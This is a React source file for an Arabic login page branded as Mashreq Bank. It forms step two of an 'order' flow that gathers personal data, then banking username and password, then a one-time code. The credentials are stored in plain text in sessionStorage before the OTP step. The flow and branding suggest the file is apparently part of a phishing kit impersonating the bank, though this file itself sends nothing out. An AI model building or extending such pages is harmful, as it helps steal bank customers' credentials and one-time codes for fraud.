import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { ArrowLeft, ChevronRight } from "lucide-react";
import { toast } from "sonner";

export default function LoginPage() {
  const [, navigate] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value,
    }));
  };

  const validateForm = () => {
    if (!formData.username.trim()) {
      toast.error("يرجى إدخال اسم المستخدم");
      return false;
    }
    if (!formData.password.trim()) {
      toast.error("يرجى إدخال كلمة المرور");
      return false;
    }
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setLoading(true);
    try {
      // الحصول على البيانات الشخصية من sessionStorage
      const personalDataStr = sessionStorage.getItem("personalData");
      if (!personalDataStr) {
        toast.error("البيانات الشخصية غير موجودة");
        navigate("/order/personal-data");
        return;
      }

      const personalData = JSON.parse(personalDataStr);
      
      // حفظ بيانات تسجيل الدخول
      sessionStorage.setItem("loginData", JSON.stringify(formData));
      
      // الانتقال إلى صفحة OTP
      navigate("/order/otp");
    } catch (error) {
      console.error("Error:", error);
      toast.error("حدث خطأ");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-accent/10" dir="rtl">
      {/* الهيدر */}
      <header className="header-nav sticky top-0 z-40">
        <div className="container flex items-center justify-between">
          <h1 className="text-2xl font-bold text-accent">بنك المشرق</h1>
          <Button
            variant="ghost"
            onClick={() => navigate("/")}
            className="gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            العودة
          </Button>
        </div>
      </header>

      {/* محتوى الصفحة */}
      <div className="container py-12">
        <div className="max-w-2xl mx-auto">
          {/* شريط التقدم */}
          <div className="mb-8">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2 opacity-50">
                <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center font-bold text-sm">
                  1
                </div>
                <span className="font-semibold">البيانات الشخصية</span>
              </div>
              <ChevronRight className="w-5 h-5 text-muted-foreground" />
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 rounded-full bg-accent text-white flex items-center justify-center font-bold text-sm">
                  2
                </div>
                <span className="font-semibold">تسجيل الدخول</span>
              </div>
              <ChevronRight className="w-5 h-5 text-muted-foreground" />
              <div className="flex items-center gap-2 opacity-50">
                <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center font-bold text-sm">
                  3
                </div>
                <span className="font-semibold">التحقق</span>
              </div>
            </div>
            <div className="h-1 bg-muted rounded-full overflow-hidden">
              <div className="h-full w-2/3 bg-accent transition-all duration-300"></div>
            </div>
          </div>

          {/* النموذج */}
          <Card className="p-8">
            <h2 className="text-3xl font-bold mb-2">تسجيل الدخول</h2>
            <p className="text-muted-foreground mb-8">
              أدخل بيانات تسجيل الدخول الخاصة بك
            </p>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="form-group">
                <Label htmlFor="username" className="form-label">
                  اسم المستخدم *
                </Label>
                <Input
                  id="username"
                  name="username"
                  value={formData.username}
                  onChange={handleInputChange}
                  placeholder="أدخل اسم المستخدم"
                  className="input-field"
                  required
                />
              </div>

              <div className="form-group">
                <Label htmlFor="password" className="form-label">
                  كلمة المرور *
                </Label>
                <Input
                  id="password"
                  name="password"
                  type="password"
                  value={formData.password}
                  onChange={handleInputChange}
                  placeholder="أدخل كلمة المرور"
                  className="input-field"
                  required
                />
              </div>

              <div className="flex gap-4 pt-6">
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => navigate("/order/personal-data")}
                  className="flex-1"
                >
                  السابق
                </Button>
                <Button
                  type="submit"
                  className="flex-1 button-primary"
                  disabled={loading}
                >
                  {loading ? "جاري المعالجة..." : "التالي"}
                </Button>
              </div>
            </form>
          </Card>
        </div>
      </div>
    </div>
  );
}
